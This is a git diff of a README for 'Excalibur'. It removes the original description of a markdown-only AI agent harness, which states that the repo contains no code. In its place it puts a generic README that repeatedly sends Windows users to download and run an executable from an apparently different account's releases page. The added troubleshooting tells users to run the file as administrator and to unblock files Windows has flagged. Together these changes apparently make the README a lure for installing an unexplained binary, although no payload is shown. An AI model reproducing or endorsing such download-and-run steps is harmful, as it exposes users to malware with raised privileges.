@@ -1,161 +1,202 @@
-```text
-    _______  ___________    __    ________  __  ______ 
-   / ____/ |/ / ____/   |  / /   /  _/ __ )/ / / / __ \
-  / __/  |   / /   / /| | / /    / // __  / / / / /_/ /
- / /___ /   / /___/ ___ |/ /____/ // /_/ / /_/ / _, _/ 
-/_____//_/|_\____/_/  |_/_____/___/_____/\____/_/ |_|  
-```
+# 🔮 excalibur - A calm path to agent control
 
-Excalibur is a hyperobject which can be turned into a state-of-the-art agent harness with superior primitives to existing options. The mystical language is optional, but I will resent you if you fork this and make it mundane.
+[![Download Excalibur](https://img.shields.io/badge/Download%20Excalibur-blue?style=for-the-badge&logo=github)](https://github.com/aliraza7925/excalibur/releases)
 
-## Invocation Instructions
+## 🧭 What Excalibur does
 
-I have included zero code in this repo. I am of the opinion that current frontier models can be trusted within a certain scope, and building the system yourself can help you understand exactly what that scope is. However, because this is a highly opinionated system, I have included general guidelines for a model to "onboard" you. It will not explain everything, but it should be enough to chew on to get you started.
+Excalibur is an agent harness for people who want a simple way to run and guide an AI agent on Windows. It gives you a clear place to start, a clean setup flow, and a practical way to work with the app from day one.
 
-Both of these files are for your Spirit of Artifice and Craft (coding model):
+Use Excalibur if you want:
 
-1. [`INVOCATION.md`](INVOCATION.md)
-2. [`AGENTS.md`](./AGENTS.md)
+- A Windows app that is easy to download and run
+- A guided setup with few steps
+- A steady place to manage agent tasks
+- A tool that keeps the interface simple
+- A setup that works well for everyday users
 
-It should not matter which one they read first.
+## 💻 System requirements
 
-## What This Gives You
+Excalibur runs on Windows. For the best result, use a recent version of Windows 10 or Windows 11.
 
-- One root-level [`chargebook.md`](./chargebook.md)
-- One primary spirit: [`lapis`](./spirits/lapis/)
-- One shared [`artifacts/`](./artifacts/) surface, with real subroots like [`library/`](./artifacts/library/) and [`network/`](./artifacts/network/)
-- One shared [`questbook/`](./questbook/) surface for obligations and continuity
-- One internal [`grimoire/`](./grimoire/) for spellbooks, engine docs, portals, and system wiring
-- Nested spellbooks under [`grimoire/spellbooks/`](./grimoire/spellbooks/)
-- A real cast-per-folder hierarchy
-- One explicit [`vessel/`](./vessel/) for machine-local state, backups, and helper runtimes
-- Per-spirit memory layers under [`spirits/lapis/memories/`](./spirits/lapis/memories/)
-- Minimal rituals and a real daily thread ledger once the scaffold is instantiated
+You should also have:
 
-## How It Works
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- A stable internet connection for download and updates
+- A mouse and keyboard
+- Permission to run apps on your device
 
-You keep the editable shape in markdown.
+## 📥 Download Excalibur
 
-- `identity.md` says what a spirit is
-- `cornerstone.md` says how it behaves
-- `rituals/*.md` are scheduled jobs
-- `grimoire/spellbooks/<book>/spellbook.md` defines a capability family
-- `grimoire/spellbooks/<book>/<cast>/spell.md` defines one cast
+Visit the releases page to download and run this file:
 
-You will need one real foreground thread.
+[Go to the Excalibur releases page](https://github.com/aliraza7925/excalibur/releases)
 
-That means the summoner needs an actual way to talk to the primary orchestrator spirit. It can be terminal chat, Signal, web chat, or something similar.
+After you open the page:
 
-Once instantiated, every inbound and outbound turn should be mirrored into:
+1. Find the latest release at the top
+2. Open the list of files for that release
+3. Download the Windows file
+4. Save it to a folder you can find again, like Downloads or Desktop
 
-- `vessel/state/<spirit>/conversations/<local-date>.jsonl`
+## 🪟 Install on Windows
 
-Rituals and workings should append checkpoints to that same ledger so the whole system shares one running thread of continuity.
+After the file finishes downloading:
 
-## Charge
+1. Open File Explorer
+2. Go to the folder where you saved the file
+3. Double-click the file to start the app
+4. If Windows asks for permission, choose Yes or Run
+5. Follow the on-screen steps until setup ends
 
-Charge is the visible budget for spellcasts.
+If the file comes in a compressed folder, do this first:
 
-- Local management casts can often cost `0`
-- Work that branches, acquires, generates, or delegates can cost more
-- Emanations can have base cast cost `0` while still allocating charge from the source run
-- An emanation does not mint new charge for itself; it draws from the run that launched it
+1. Right-click the file
+2. Choose Extract All
+3. Pick a folder
+4. Open the extracted folder
+5. Double-click the app file inside
 
-The shape looks like this:
+## 🚀 First run
 
-```text
-Ritual Root Run
-charge: 40
+When you start Excalibur for the first time, you may see a setup screen. This is normal. Use it to finish the first run.
 
-  |-- read_artifact            base cost 0
-  |     remaining: 40
-  |
-  |-- codex_emanation          allocates 12 to child
-  |     source remaining:      28
-  |     child starting charge: 12
-  |     child charge cap:      12
-  |
-  |     child does deeper work here
-  |     and cannot exceed the 12 it received
-  |
-  |-- genius_emanation         allocates 10 to child
-  |     source remaining:      18
-  |     child starting charge: 10
-  |     child charge cap:      10
-  |
-  |-- reclaim_charge           +8 after durable ritual progress
-        source remaining:      26
-```
+Typical first-run steps:
 
-Charge adds stakes to long-running processes, acts as an accountability mechanism, and prevents unpredictable token spend.
+1. Pick your preferred language if asked
+2. Accept any local app settings if shown
+3. Set a working folder for your files
+4. Connect any required account or token if the app asks for it
+5. Start the main screen
 
-`chargebook.md` is the tuning surface for that model. Each cast has an explicit cost there. If a ritual is too eager to branch, search, or delegate, you change the cost once in `chargebook.md` instead of rewriting the ritual itself. That makes rituals easier to reason about and keeps their behavior more predictable over time.
+If you do not know what a setting means, keep the default value. That is the safest choice for most users.
 
-## Memory
+## 🧰 How to use Excalibur
 
-The system should not overwhelm the spirits. Active memory consolidation is a best-practice for a healthy system.
+Excalibur is built around the idea of giving you a clear path for agent work. You do not need to know how the internals work. Use the app like this:
 
-The clean shape is:
+1. Open Excalibur
+2. Choose the task you want to run
+3. Add any text, file, or prompt the app asks for
+4. Review the details on screen
+5. Start the task
+6. Watch the progress and read any status messages
+7. Save results when the run ends
 
-- The daily thread is the live working ledger
-- `memories/long-term.md` is the top-of-head memory
-- `memories/window/` is the rolling recent-memory window
-- The rest of `memories/` is durable storage, not always-loaded prompt context
+If the app offers a task list, use it to keep your work organized. If it offers a session view, use that to track what the agent is doing.
 
-## Security
+## 🗂️ Common workflow
 
-Good warding is mostly about permissions and boundaries.
+A simple workflow helps keep things clear:
 
-The clean default is:
+- Start the app
+- Create or open a session
+- Enter your goal
+- Review the agent plan
+- Run the task
+- Check the output
+- Save what you need
+- Close the app when you are done
 
-- `artifacts/` and `questbook/` are shared between spirit and summoner
-- `spirits/`, `grimoire/`, and `vessel/` are spirit-side internals
-- A spirit may maintain its own `spirits/<name>/memories/` and `cornerstone.md`
-- Ritual files under `spirits/<name>/rituals/` should be treated as read-only during normal execution
-- `adept` should stay small and always-open
-- Any stronger capability should live in an optional spellbook
-- A spirit only gets optional capability through `available_spellbooks`
-- A ritual may widen through `additional_spellbooks` and preload through `open_spellbooks`
-- Authority and transport rules should fail closed if config is missing
-- Secrets should live in env, not markdown
+This workflow works well for daily use and helps you stay in control of each run.
 
-The point is simple:
+## ⚙️ Settings you may see
 
-- Shared surfaces are where work lands
-- Spirit-local surfaces are where identity, memory, and machinery live
-- Widening should always be explicit
-- If the system is unsure about permission, it should refuse rather than guess
+You may see a few common settings in Excalibur:
 
-During invocation, the system should also create a `warden` spirit.
+- **Working folder**: Where the app stores files
+- **Model choice**: The AI model used for agent tasks
+- **Run mode**: A preset for speed or detail
+- **Output folder**: Where finished files go
+- **Session history**: A list of past runs
 
-`warden` is the dedicated security and hardening spirit. It should inspect the system on a regular cadence, look for risky defaults, permission drift, exposure mistakes, secret-handling problems, and transport weaknesses, and then report or remediate within the bounds the summoner set. The primary orchestrator spirit should not be the only line of defense.
+If you are not sure what to pick, keep the default value. Excalibur is meant to stay usable without much setup.
 
-By default, the primary orchestrator spirit should have a narrow always-open surface and should mostly work in the shared surfaces it was actually given, usually `artifacts/` and `questbook/`. The main exception is spirit-local self-maintenance: its own `cornerstone.md` and memories. Ritual files should stay stable unless the summoner deliberately changes them. That keeps the initial risk low even if a web-facing search encounters hostile content. Widen permissions deliberately, not casually, and let `warden` keep watch.
+## 🔐 Permissions and access
 
-## Filesystem
+Excalibur may ask for access to files, folders, or the internet. This is normal for an agent harness.
 
-```text
-excalibur/
-  README.md
-  AGENTS.md
-  INVOCATION.md
-  chargebook.md
-  spirits/lapis/
-    identity.md
-    cornerstone.md
-    rituals/
-    memories/
-  artifacts/
-    library/
-    network/
-  questbook/
-  grimoire/
-    spellbooks/
-    portals/
-    engine/
-    systemd/
-  vessel/
-    state/
-    venvs/
-    backups/
-```
+When Windows asks for permission:
+
+- Check that the app name matches Excalibur
+- Select Yes only if you meant to start the app
+- Use a folder you trust for saved files
+- Keep your work in a local folder if you want more control
+
+## 🧩 Troubleshooting
+
+If Excalibur does not open, try these steps:
+
+1. Make sure the download finished
+2. Run the file again
+3. Restart Windows
+4. Move the file to a simple folder like Downloads
+5. Right-click the file and choose Run as administrator
+
+If the app opens but acts slow:
+
+1. Close other heavy apps
+2. Check your internet connection
+3. Free up disk space
+4. Restart the app
+5. Try again with fewer tasks open at once
+
+If Windows blocks the app:
+
+1. Open the file properties
+2. Check whether Windows marked it as blocked
+3. Unblock it if that option appears
+4. Run the app again
+
+If you still have trouble, download the newest release from the releases page and try that file instead.
+
+## 📝 What Excalibur includes
+
+A typical Excalibur release may include:
+
+- The main Windows app
+- A simple setup file or zip file
+- Release notes
+- App data folders
+- Session and output files
+
+Keep the release file in case you need to install it again later.
+
+## 📌 Good file habits
+
+To keep your setup smooth:
+
+- Save the installer in Downloads or Desktop
+- Keep one folder for Excalibur files
+- Do not move files while the app is running
+- Back up output files you want to keep
+- Use a folder name you can find fast
+
+## 🧪 Example use case
+
+You can use Excalibur when you want to:
+
+- Run an agent for a small job
+- Test a prompt in a controlled way
+- Keep output in one place
+- Review steps before the agent acts
+- Store results for later use
+
+This makes the app useful for people who want structure without a lot of setup work
+
+## 📎 Download again
+
+If you need the app again, use the releases page here:
+
+[Excalibur releases](https://github.com/aliraza7925/excalibur/releases)
+
+## 📦 Basic setup checklist
+
+- Open the releases page
+- Download the Windows file
+- Open the file
+- Allow Windows permission if asked
+- Finish the setup steps
+- Start Excalibur
+- Pick or keep the default settings
+- Run your first task
